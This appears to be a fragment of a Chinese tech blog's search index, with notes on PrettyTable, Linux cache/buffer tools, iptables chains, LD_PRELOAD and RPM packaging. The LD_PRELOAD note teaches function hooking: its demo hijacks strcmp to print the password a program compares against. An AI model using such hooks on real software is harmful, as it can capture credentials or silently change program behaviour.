class="number">3</span>))</span><br><span class="line"><span class="comment"># 删除除前3行以外的所有行，可通过将表切片为Python列表来创建一个只包含这些规则的新PrettyTable对象：</span></span><br><span class="line">new_table = old_table[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(new_table)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 表排序</span></span><br><span class="line"><span class="comment">#+ 以相反的顺序对表进行排序（从大到小）</span></span><br><span class="line"><span class="built_in">print</span>(x.get_string(sortby=<span class="string">&quot;Annual Rainfall&quot;</span>, reversesort=<span class="literal">True</span>))</span><br></pre></td></tr></table></figure><h3 id="3-4、控制表样式"><a href="#3-4、控制表样式" class="headerlink" title="3.4、控制表样式"></a>3.4、控制表样式</h3><h4 id="3-4-1、临时设置表样式："><a href="#3-4-1、临时设置表样式：" class="headerlink" title="3.4.1、临时设置表样式："></a>3.4.1、临时设置表样式：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可在使用set_style之前使用get_string方法获取该表的样式：</span></span><br><span class="line"><span class="comment">#+ 除了MSWORD_FRIENDLY目前还有两种内置样式可用于表：</span></span><br><span class="line"><span class="comment">#+ DEFAULT - 默认外观，用于撤消您可能进行的任何样式更改；</span></span><br><span class="line"><span class="comment">#+ PLAIN_COLUMNS - 无边框样式，适用于柱状数据的命令行程序</span></span><br><span class="line"><span class="keyword">from</span> prettytable <span class="keyword">import</span> MSWORD_FRIENDLY</span><br><span class="line">x.set_style(MSWORD_FRIENDLY) </span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><p>手动更改表格样式：</p><ul><li><code>border</code>- 布尔选项（必须是<code>True</code>或<code>False</code>），是否在表格周围绘制边框；</li><li><code>header</code>- 布尔选项（必须是<code>True</code>或<code>False</code>），表格的第一行是否显示所有字段名称的标题；</li><li><code>header_style</code> - 控制标题中字段名称的大写，允许值如下，默认值为None：<ul><li><code>cap</code>：每个单词的首字母大写;</li><li><code>title</code>：标题大小写；</li><li><code>upper</code>：全部为大写；</li><li><code>lower</code>：全部为小写；</li><li><code>None</code>：不更改原始字段名称设置；</li></ul></li><li><code>hrules</code> - 控制行后水平规则的打印，可选值为<code>FRAME</code>，<code>ALL</code>，<code>NONE</code> ；这些是<code>prettytable</code>模块内定义的变量，因此请确保导入或使用<code>prettytable.FRAME</code>等：</li><li><code>vrules</code> - 控制列之间垂直规则的打印，可选值为：<code>FRAME</code>，<code>ALL</code>，<code>NONE</code>；</li><li><code>align</code> - 水平对齐，可选值为：空，<code>l</code>（左），<code>c</code>（中），<code>r</code>（右）；</li><li><code>valign</code> - 垂直对齐，可选至为：空，<code>t</code>（顶部），<code>m</code>（中间），<code>b</code>（底部）；</li><li><code>int_format</code> - 控制整数数据的格式，为一个字符串，为“％”和“d”之间<code>print &quot;%d&quot; % 42</code>；</li><li><code>float_format</code> - 控制浮点数据的格式，为一个字符串，为“％”和“f”之间<code>print &quot;%f&quot; % 4.2</code>；</li><li><code>padding_width</code> - 列数据两侧的空格数（仅在左右填充为None时使用）；</li><li><code>left_padding_width</code> - 列数据左侧的空格数；</li><li><code>right_padding_width</code> - 列数据右侧的空格数；</li><li><code>vertical_char</code> - 用于绘制垂直线的单个字符，默认是<code>|</code>；</li><li><code>horizontal_char</code> - 用于绘制水平线的单个字符，默认是<code>-</code>；</li><li><code>junction_char</code> - 用于绘制线结的单个字符，默认是<code>+</code>；</li></ul><h4 id="3-4-2、长期设置样式："><a href="#3-4-2、长期设置样式：" class="headerlink" title="3.4.2、长期设置样式："></a>3.4.2、长期设置样式：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 更改相应的属性即可为“长期”设置选项</span></span><br><span class="line">x.border = <span class="literal">False</span></span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><p>如果您在创建表时知道所需的样式选项，则可以使用构造函数的关键字参数指定它们，更改相应的属性即可为“长期”设置选项；例如，以下两个代码块是等效的：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 代码块一</span></span><br><span class="line">x = PrettyTable()</span><br><span class="line">x.border = <span class="literal">False</span></span><br><span class="line">x.header = <span class="literal">False</span></span><br><span class="line">x.padding_width = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 代码块二</span></span><br><span class="line">x = PrettyTable(border=<span class="literal">False</span>, header=<span class="literal">False</span>, padding_width=<span class="number">5</span>)</span><br></pre></td></tr></table></figure><h4 id="3-4-3、列设置"><a href="#3-4-3、列设置" class="headerlink" title="3.4.3、列设置"></a>3.4.3、列设置</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用属性赋值而非关键字参数设置某些设置，可以按列控制某些设置，设置列对齐方式如下：</span></span><br><span class="line"><span class="built_in">print</span>(x.get_string(align=<span class="string">&quot;l&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">x.align = <span class="string">&quot;l&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将对齐设置为所有列的左侧，但您可以像这样设置各列的对齐方式</span></span><br><span class="line">x.align[<span class="string">&quot;City name&quot;</span>] = <span class="string">&quot;l&quot;</span></span><br><span class="line">x.align[<span class="string">&quot;Population&quot;</span>] = <span class="string">&quot;c&quot;</span></span><br><span class="line">x.align[<span class="string">&quot;Area&quot;</span>] = <span class="string">&quot;r&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面的将覆盖上面的列设置，再次将所有列设置为“l”</span></span><br><span class="line">x.align = <span class="string">&quot;l&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
            <tag> PrettyTable </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下的Cache/Buffer</title>
      <link href="/2019/01/01/cache-and-buffer/"/>
      <url>/2019/01/01/cache-and-buffer/</url>
      
        <content type="html"><![CDATA[<h2 id="一、含义"><a href="#一、含义" class="headerlink" title="一、含义"></a>一、含义</h2><ul><li><p>Cache（缓存）：指 CPU 和内存之间高速缓存，为了调高CPU和内存之间数据交换而设计，用来给文件做缓存（相关的是PageCache），主要是针对读操作设计的；</p></li><li><p>Buffer（缓冲）：指在写入磁盘前的存储在内存中的内容，为了提高内存和硬盘（或其他I&#x2F;O设备的数据交换而设计），主要是针对写操作设计的；</p></li></ul><p><img src="https://cdn.bugwz.com/image-20190908164902457.png" alt="Cache/Buffer所处位置图解"></p><p>下面为Linux下free指令显示的信息，以下简单描述一下各选项的含义：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@* ~]<span class="comment"># free -g</span></span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:            125           2         109           1          13         120</span><br><span class="line">Swap:             7           0           7</span><br></pre></td></tr></table></figure><ul><li><strong>Mem</strong>：表示物理内存的统计信息；</li><li><strong>Swap</strong>：表示磁盘上交换分区的使用情况；</li><li>total：总的内存大小；</li><li>used：已经使用的内存大小（包含buff&#x2F;cache和shared的大小）；</li><li>free：空闲的内存大小；</li><li>shared：进程间的内存大小；</li><li>buff：写磁盘的数据在内存中缓存的数据大小，能够快速响应，后续会将数据定期刷到磁盘上；</li><li>cache：读取的数据在内存中缓存的数据大小，下次读取时能够快速返回；</li><li>available：真正可用的内存大小；</li></ul><h2 id="二、缓存相关脚本"><a href="#二、缓存相关脚本" class="headerlink" title="二、缓存相关脚本"></a>二、缓存相关脚本</h2><h3 id="2-1、缓存清理方式"><a href="#2-1、缓存清理方式" class="headerlink" title="2.1、缓存清理方式"></a>2.1、缓存清理方式</h3><ul><li><p>清理<code>pagecache</code>（页面缓存）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/vm/drop_caches <span class="comment"># sysctl -w vm.drop_caches=1</span></span><br></pre></td></tr></table></figure></li><li><p>清理<code>dentries</code>（目录的数据结构）和<code>inodes</code>（文件的数据结构）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/vm/drop_caches <span class="comment"># sysctl -w vm.drop_caches=2</span></span><br></pre></td></tr></table></figure></li><li><p>清理<code>pagecache</code>（页面缓存）、<code>dentries</code>（目录的数据结构）和<code>inodes</code>（文件的数据结构）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 3 &gt; /proc/sys/vm/drop_caches <span class="comment"># sysctl -w vm.drop_caches=3</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="2-2、缓存使用分析"><a href="#2-2、缓存使用分析" class="headerlink" title="2.2、缓存使用分析"></a>2.2、缓存使用分析</h3><h4 id="2-2-1、slabtop指令"><a href="#2-2-1、slabtop指令" class="headerlink" title="2.2.1、slabtop指令"></a>2.2.1、slabtop指令</h4><p>内核的模块在分配资源的时候，为了提高效率和资源的利用率，都是透过<code>slab</code>来分配的。通过<code>slab</code>的信息，再配合源码能粗粗了解系统的运行情况，比如说什么资源有没有不正常的多，或者什么资源有没有泄漏。Linux系统透过<code>/proc/slabinfo</code>来向用户暴露slab的使用情况。</p><p>Linux所使用的 slab 分配器的基础是<code>Jeff Bonwick</code> 为 <code>SunOS</code> 操作系统首次引入的一种算法。Jeff 的分配器是围绕对象缓存进行的。在内核中，会为有限的对象集（例如文件描述符和其他常见结构）分配大量内存。Jeff 发现对内核中普通对象进行初始化所需的时间超过了对其进行分配和释放所需的时间。因此他的结论是不应该将内存释放回一个全局的内存池，而是将内存保持为针对特定目而初始化的状态。<code>Linux slab 分配器</code>使用了这种思想和其他一些思想来构建一个在空间和时间上都具有高效性的内存分配器。</p><p>使用<code>slabtop</code>命令可以实时的显示内核中<code>slab缓冲区</code>的细节信息，相关选项参数为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--delay=n, -d n：每n秒更新一次显示的信息，默认是每3秒；</span><br><span class="line">--<span class="built_in">sort</span>=S, -s S：指定排序标准进行排序（排序标准，参照man手册）；</span><br><span class="line">--once, -o：显示一次后退出；</span><br><span class="line">--version, -V：显示版本；</span><br><span class="line">--<span class="built_in">help</span>：显示帮助信息。</span><br></pre></td></tr></table></figure><p><img src="https://cdn.bugwz.com/image-20190908190424569.png" alt="slabtop运行状态示意图"></p><h4 id="2-2-2、使用fincore-C-或pcstat-Go-分析程序的cache的占用"><a href="#2-2-2、使用fincore-C-或pcstat-Go-分析程序的cache的占用" class="headerlink" title="2.2.2、使用fincore(C)或pcstat(Go)分析程序的cache的占用"></a>2.2.2、使用fincore(C)或pcstat(Go)分析程序的cache的占用</h4><p><code>fincore</code>是<code>linux-ftools</code>工具集中的一个工具，其他的工具还有<code>fallocate</code>和<code>fadvise</code>，<code>linux-ftools</code>项目原来在<code>Google Code</code>上进行维护，但是<code>Google Code</code>已经在2016年就停止维护了，不过依旧可以在Github上寻找到该项目，目前我也将该项目迁移到了我自己的Github主页上，并做了一些简单的变动，项目地址为：<a href="https://github.com/bugwz/linux-ftools">bugwz&#x2F;linux-ftools</a>，fincore的编译安装在项目中有详细介绍。</p><p><a href="https://github.com/tobert/pcstat">pcstat</a>工具实现了与<code>fincore</code>相同的功能，并且输出效果看起来更为优雅，不过目前这里只演示<code>fincore</code>的工具使用。</p><p><code>fincore</code>工具运行如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@*-self linux-ftools]<span class="comment"># ./fincore</span></span><br><span class="line">fincore version 1.0.0</span><br><span class="line">fincore [options] files...</span><br><span class="line"></span><br><span class="line">  --pages=<span class="literal">false</span>      Don<span class="string">&#x27;t print pages</span></span><br><span class="line"><span class="string">  --summarize        When comparing multiple files, print a summary report</span></span><br><span class="line"><span class="string">  --only-cached      Only print stats for files that are actually in cache.</span></span><br></pre></td></tr></table></figure><p>使用<code>fincore</code>工具配合<a href="https://blog.51cto.com/shanker">Shanker</a>提供的脚本，即可简单的查看<code>cache</code>的占用情况，相关脚本如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#Author: Shanker</span></span><br><span class="line"><span class="comment">#Time: 2016/06/08</span></span><br><span class="line"><span class="comment">#set -e</span></span><br><span class="line"><span class="comment">#set -u</span></span><br><span class="line"><span class="comment">#you have to install fincore</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f /usr/local/bin/fincore ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;You haven&#x27;t installed fincore yet&quot;</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#find the top 10 processs&#x27; cache file</span></span><br><span class="line">ps -e -o pid,rss | <span class="built_in">sort</span> -nk2 -r | <span class="built_in">head</span> -10 | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; /tmp/cache.pids</span><br><span class="line"><span class="comment">#find all the processs&#x27; cache file</span></span><br><span class="line"><span class="comment">#ps -e -o pid &gt; /tmp/cache.pids</span></span><br><span class="line"><span class="keyword">if</span> [ -f /tmp/cache.files ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;The cache.files is exist, removing now &quot;</span></span><br><span class="line">    <span class="built_in">rm</span> -f /tmp/cache.files</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    lsof -p <span class="variable">$line</span> 2&gt;/dev/null | awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span> &gt;&gt; /tmp/cache.files </span><br><span class="line"><span class="keyword">done</span> &lt; /tmp/cache.pids</span><br><span class="line"><span class="keyword">if</span> [ -f /tmp/cache.fincore ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;The cache.fincore is exist, removing now&quot;</span></span><br><span class="line">    <span class="built_in">rm</span> -f /tmp/cache.fincore</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `<span class="built_in">cat</span> /tmp/cache.files`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="variable">$i</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$i</span> &gt;&gt; /tmp/cache.fincore</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">fincore -s  `<span class="built_in">cat</span> /tmp/cache.fincore`</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/cache.&#123;pids,files,fincore&#125;</span><br></pre></td></tr></table></figure><p>执行脚本的结果如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">     Name         Size(bytes)   TotalPages  CachedPages   CachedSizes     CachedPercent</span><br><span class="line">/data/check1.sh       40             1          1             4096           100.00%</span><br><span class="line">/data/check2.sh       40             1          1             4096           100.00%</span><br><span class="line">/data/check3.sh       40             1          1             4096           100.00%</span><br><span class="line">/data/check4.sh       40             1          1             4096           100.00%</span><br><span class="line">/data/check5.sh       40             1          1             4096           100.00%</span><br><span class="line">/data/check6.sh       40             1          1             4096           100.00%</span><br><span class="line">/data/check7.sh       40             1          1             4096           100.00%</span><br><span class="line">/data/check8.sh       40             1          1             4096           100.00%</span><br><span class="line">/data/check9.sh       40             1          1             4096           100.00%</span><br><span class="line">/data/check10.sh      40             1          1             4096           100.00%</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Memory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netfilter的数据包过滤器iptables</title>
      <link href="/2019/01/01/iptables/"/>
      <url>/2019/01/01/iptables/</url>
      
        <content type="html"><![CDATA[<h2 id="一、iptables简介"><a href="#一、iptables简介" class="headerlink" title="一、iptables简介"></a>一、iptables简介</h2><p>iptables是一款基于Netfilter的Linux防火墙的管理工具，可实现完成封包过滤、封包重定向和网络地址转换（NAT）等功能。</p><h2 id="二、iptables的基本概念"><a href="#二、iptables的基本概念" class="headerlink" title="二、iptables的基本概念"></a>二、iptables的基本概念</h2><h3 id="2-1、iptables的规则表"><a href="#2-1、iptables的规则表" class="headerlink" title="2.1、iptables的规则表"></a>2.1、iptables的规则表</h3><ul><li><code>表（tables）</code>：提供特定的功能，iptables内置了4个表，即filter表、nat表、mangle表和raw表，分别用于实现包过滤，网络地址转换、包重构(修改)和数据跟踪处理；</li><li><code>链（chains）</code>：数据包传播的路径，每一条链其实就是众多规则中的一个检查清单，每一条链中可以有一条或数条规则；</li><li><code>规则（rules）</code>：当一个数据包到达一个链时，iptables就会从链中第一条规则开始检查，看该数据包是否满足规则所定义的条件，如果满足规则，系统就会根据该条规则所定义的方法处理该数据包，如果不满足规则，继续检查下一条规则，如果该数据包不符合链中任一条规则，iptables就会根据该链预先定义的默认策略来处理数据包；</li></ul><h3 id="2-2、iptables的规则链"><a href="#2-2、iptables的规则链" class="headerlink" title="2.2、iptables的规则链"></a>2.2、iptables的规则链</h3><ul><li><code>PREROUTING链</code>：数据进入网卡，首先会进入<code>PREROUTING链</code>，内核依据数据包的目的IP判断是否需要传送出去；</li><li><code>FORWARD链</code>：数据包需要转发，并且内核允许转发，则该数据包经过该链，进入<code>POSTROUTING链</code>；</li><li><code>INPUT链</code>：数据包目的为本机，进入<code>INPUT链</code>，本机的所有进程均可访问到该数据包；</li><li><code>OUTPUT链</code>：本机的进程发送数据包至<code>OUTPUT链</code>；</li><li><code>POSTROUTING链</code>：数据包经过该链；</li></ul><h3 id="2-3、iptables的规则表与规则链的关系"><a href="#2-3、iptables的规则表与规则链的关系" class="headerlink" title="2.3、iptables的规则表与规则链的关系"></a>2.3、iptables的规则表与规则链的关系</h3><p><img src="https://cdn.bugwz.com/image-20190816164844503.png" alt="iptables中的数据包路线"></p><h4 id="2-3-1、规则表过滤数据包的优先顺序及介绍："><a href="#2-3-1、规则表过滤数据包的优先顺序及介绍：" class="headerlink" title="2.3.1、规则表过滤数据包的优先顺序及介绍："></a>2.3.1、规则表过滤数据包的优先顺序及介绍：</h4><p>在<code>REHL4</code>中是三张表五个链，在<code>REHL5</code>成了四张表五个链。</p><ul><li><p><code>Raw表</code>：</p><ul><li><code>链</code>：OUTPUT、PREROUTING；</li><li><code>作用</code>：决定数据包是否被状态跟踪机制处理；</li><li><code>内核模块</code>：iptable_raw；</li></ul></li><li><p><code>Mangle表</code>：</p><ul><li><code>链</code>：PREROUTING、POSTROUTING、INPUT、OUTPUT、FORWARD；</li><li><code>作用</code>：修改数据包的服务类型、TTL、并且可以配置路由实现QOS；</li><li><code>内核模块</code>：iptable_mangle；</li></ul></li><li><p><code>Nat表</code>：</p><ul><li><code>链</code>：PREROUTING、POSTROUTING、OUTPUT；</li><li><code>作用</code>：用于网络地址转换（IP、端口）；</li><li><code>内核模块</code>：iptable_nat；</li></ul></li><li><p><code>Filter表</code>：</p><ul><li><code>链</code>：INPUT、FORWARD、OUTPUT；</li><li><code>作用</code>：主要用于过滤数据包；</li><li><code>内核模块</code>：iptables_filter；</li></ul></li></ul><h4 id="2-3-2、规则链之间的优先顺序（分三种情况）："><a href="#2-3-2、规则链之间的优先顺序（分三种情况）：" class="headerlink" title="2.3.2、规则链之间的优先顺序（分三种情况）："></a>2.3.2、规则链之间的优先顺序（分三种情况）：</h4><ul><li><code>第一种情况：入站数据流向</code><ul><li><code>PREROUTING链</code>：从外界到达防火墙的数据包，先被PREROUTING规则链处理（是否修改数据包地址等）；</li><li><code>INPUT链</code>：数据包目标为本地，内核将其传给INPUT链进行处理（是否允许通过等），通过以后再交给系统上层的应用程序进行响应；</li></ul></li><li><code>第二种情况：转发数据流向</code><ul><li><code>PREROUTING链</code>：从外界到达防火墙的数据包，先被PREROUTING规则链处理（是否修改数据包地址等）；</li><li><code>FORWARD链</code>：数据包目标为其他外部地址，内核将其传递给FORWARD链进行处理（是否转发或拦截）；</li><li><code>POSTROUTING链</code>：之后交给POSTROUTING规则链（是否修改数据包的地址等）进行处理；</li></ul></li><li><code>第三种情况：出站数据流向</code><ul><li><code>OUTPUT链</code>：防火墙本机向外部地址发送的数据包，首先被OUTPUT规则链处理，之后进行路由选择；</li><li><code>POSTROUTING链</code>：路由选择后传递给POSTROUTING规则链（是否修改数据包的地址等）进行处理；</li></ul></li></ul><h2 id="三、iptables的使用"><a href="#三、iptables的使用" class="headerlink" title="三、iptables的使用"></a>三、iptables的使用</h2>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Iptables </tag>
            
            <tag> Netfilter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>共享库LD_PRELOAD环境变量分析</title>
      <link href="/2019/01/01/ld-preload/"/>
      <url>/2019/01/01/ld-preload/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>LD_PRELOAD</code>是<code>Linux/Unix</code>系统的一个环境变量，它影响程序的运行时的链接（Runtime linker），它允许在程序运行前定义优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p><p><strong>动态库的搜索路径搜索的先后顺序是：</strong></p><ul><li>编译目标代码时指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）；</li><li>环境变量<code>LD_LIBRARY_PATH</code>指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）；</li><li>配置文件<code>/etc/ld.so.conf</code>中指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）；</li><li>默认的动态库搜索路径<code>/lib</code>；</li><li>默认的动态库搜索路径<code>/usr/lib</code>；</li></ul><h2 id="二、模拟实现"><a href="#二、模拟实现" class="headerlink" title="二、模拟实现"></a>二、模拟实现</h2><p>这里并不是直接替换系统中的函数调用，而是采用添加hook的方式进行；</p><ul><li>main.c</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;test&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Incorrect password\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Correct password\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>用于劫持函数的<code>.so</code>代码<code>hook.c</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* hook的目标是strcmp，所以typedef了一个STRCMP函数指针，</span></span><br><span class="line"><span class="comment"> * hook的目的是要控制函数行为，从原库libc.so.6中拿到strcmp指针，保存成old_strcmp以备调用. */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(*STRCMP)</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*, <span class="type">const</span> <span class="type">char</span>*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s1, <span class="type">const</span> <span class="type">char</span> *s2)</span> &#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">void</span> *handle = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">static</span> STRCMP old_strcmp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!handle) &#123;</span><br><span class="line">    handle = dlopen(<span class="string">&quot;libc.so.6&quot;</span>, RTLD_LAZY);</span><br><span class="line">    old_strcmp = (STRCMP)dlsym(handle, <span class="string">&quot;strcmp&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;oops!!! hack function invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;\n&quot;</span>, s1, s2);</span><br><span class="line">  <span class="keyword">return</span> old_strcmp(s1, s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>编译运行：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译</span></span><br><span class="line">gcc -o main main.c</span><br><span class="line">gcc -fPIC -shared -o hook.so hook.c -ldl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">LD_PRELOAD=./hook.so ./main 123</span><br></pre></td></tr></table></figure><ul><li>运行结果：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">oops!!! hack <span class="keyword">function</span> invoked. s1=&lt;123&gt; s2=&lt;<span class="built_in">test</span>&gt;</span><br><span class="line">Incorrect password</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RPM打包记录</title>
      <link href="/2019/01/01/make-rpm/"/>
      <url>/2019/01/01/make-rpm/</url>
      
        <content type="html"><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>RPM（Redhat Package Manager）是一个开放的软件包管理系统，用于Redhat、CentOS、Fedora等Linux 分发版的常见的软件包管理器。因为它允许分发已编译的软件，所以用户只用一个命令就可以安装软件。</p><p>RPM拥有功能强大的查询选项。我们可以搜索数据库来查询软件包或文件。RPM软件包中的文件是以压缩格式存放的，拥有一个定制的二进制头文件，其中包含有关包和内容的信息，可以让我们对单个软件包的查询简便又快速。</p><p>RPM另一个强大的功能是进行软件包的验证。如果我们担心误删了某个软件包中的某个文件，我们就可以对它进行验证。任何非正常现象将会被通知。如果需要的话还可以重新安装该软件包。在重新安装过程中，所有被修改过的配置文件将被保留。</p><p>RPM设计目标之一就是要保持软件包的原始特征， 就象该软件的原始发布者发布软件时那样。通过使用RPM我们可以拥有最初的软件和最新的补丁程序，还有详细的软件构建信息。</p><p>概括的说：RPM有五种基本的操作功能(不包括创建软件包)：安装、卸载、升级、查询、和验证。</p><h1 id="二、打包基础"><a href="#二、打包基础" class="headerlink" title="二、打包基础"></a>二、打包基础</h1><h2 id="2-1-打包环境"><a href="#2-1-打包环境" class="headerlink" title="2.1 打包环境"></a>2.1 打包环境</h2><p>本文使用CentOS作为rpm打包的打包环境，同时安装一些打包必备的软件，针对不同软件的构建过程，我们还需要其他的编译打包工具，比如C&#x2F;C++的make与gcc，Python的setuptools等，我们根据具体需求进行安装即可；</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装依赖软件包</span></span><br><span class="line">yum -y install gcc gcc-c++ autoconf automake zlib-devel openssl-devel pcre-devel</span><br><span class="line"><span class="comment"># 安装rpm-build打包工具</span></span><br><span class="line">yum -y install rpm-build</span><br><span class="line"><span class="comment"># 创建rpm打包环境依赖目录</span></span><br><span class="line"><span class="built_in">mkdir</span> -p ~/rpmbuild/&#123;BUILD,RPMS,S&#123;OURCES,PECS,RPMS&#125;&#125;</span><br><span class="line"><span class="comment"># 声明rpm build环境根目录</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;%_topdir %(echo <span class="variable">$HOME</span>)/rpmbuild&quot;</span> &gt; ~/.rpmmacros</span><br></pre></td></tr></table></figure><h2 id="2-2-软件包描述文件-SPEC"><a href="#2-2-软件包描述文件-SPEC" class="headerlink" title="2.2 软件包描述文件(SPEC)"></a>2.2 软件包描述文件(SPEC)</h2><p>制作一个rpm软件包就必须写一个软件包描述文件（SPEC），这个文件中包含了软件包的诸多信息，如软件包的名字、版本、类别、说明摘要、创建时要执行什么指令、安装时要执行什么操作、以及软件包所要包含的文件列表等等。</p><h3 id="2-2-1-文件头"><a href="#2-2-1-文件头" class="headerlink" title="2.2.1 文件头"></a>2.2.1 文件头</h3><p>一般的spec文件头包含以下几个域：</p><ul><li><p>Summary：用一句话概括该软件包尽量多的信息；</p></li><li><p>Name：软件包的名字，最终RPM软件包是用该名字与版本号，释出号及体系号来命名软件包；</p></li><li><p>Version：软件版本号。仅当软件包比以前有较大改变时才增加版本号；</p></li><li><p>Release：软件包释出号。一般我们对该软件包做了一些小的补丁的时候就应该把释出号加1；</p></li><li><p>Vendor：软件开发者的名字；</p></li><li><p>Copyright：软件包所采用的版权规则。具体有：GPL（自由软件），BSD，MIT，Public 